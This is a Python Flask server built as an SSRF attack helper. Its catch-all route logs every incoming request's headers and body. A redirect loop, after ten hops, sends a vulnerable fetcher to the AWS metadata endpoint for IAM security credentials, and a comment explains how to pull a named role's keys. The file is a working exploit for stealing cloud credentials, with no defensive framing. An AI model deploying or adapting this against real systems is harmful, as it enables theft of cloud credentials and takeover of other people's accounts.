from flask import Flask, request, redirect

app = Flask(__name__)

# SSRF test logging
@app.route("/", defaults={"path": ""}, methods=["GET","POST"])
@app.route("/<path:path>", methods=["GET","POST"])
def catch_all(path):
    print("---- Incoming Request ----")
    print("Path:", path)
    print("Method:", request.method)
    print("Headers:", dict(request.headers))
    print("Query:", dict(request.args))
    print("Body:", request.get_data())
    print("--------------------------")
    return "OK", 200

@app.route('/redir', methods=['GET', 'POST'])
def redir():
    """Handle redirects with loop counter - after 10 redirects, go to final SSRF location."""
    # Get the current redirect count from query parameter, default to 0
    redirect_count = int(request.args.get('count', 0))

    # Increment the counter
    redirect_count += 1
    status_code = 301 + redirect_count
    # If we've reached 10 redirects, redirect to our desired location
    # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
    if redirect_count >= 10:
        return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/", code=302)
    print("trying: " + str(status_code))
    # Otherwise, redirect back to /redir with incremented counter
    return redirect(f"/redir?count={redirect_count}", code=status_code)

@app.route('/start', methods=['POST', 'GET'])
def start():
    """Starting point for redirect loop."""
    return redirect("/redir", code=302)
    
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
